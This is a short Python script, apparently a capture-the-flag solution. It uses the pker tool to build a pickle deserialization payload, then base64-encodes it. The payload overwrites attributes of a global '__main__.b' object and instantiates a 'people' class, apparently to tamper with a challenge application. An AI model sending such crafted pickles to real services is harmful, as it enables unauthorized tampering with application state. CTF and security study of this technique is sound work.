import base64
import os

payload = """b = GLOBAL('__main__', 'b')
b.name = 'kleinor'
b.sex = 'kleinor'
b.age = 'kleinor'
people = INST('__main__', 'people', 'kleinor', 'kleinor', 'kleinor')
return people"""

with open('x', 'w') as f:
    f.write(payload)

stdout = os.popen("python pker.py < x").read()  # 执行并输出命令的执行结果
s = stdout[2:-2]
s = s.encode().decode('unicode_escape')  # unescape slash
print(s)
res = base64.b64encode(s.encode()).decode()
print(res)
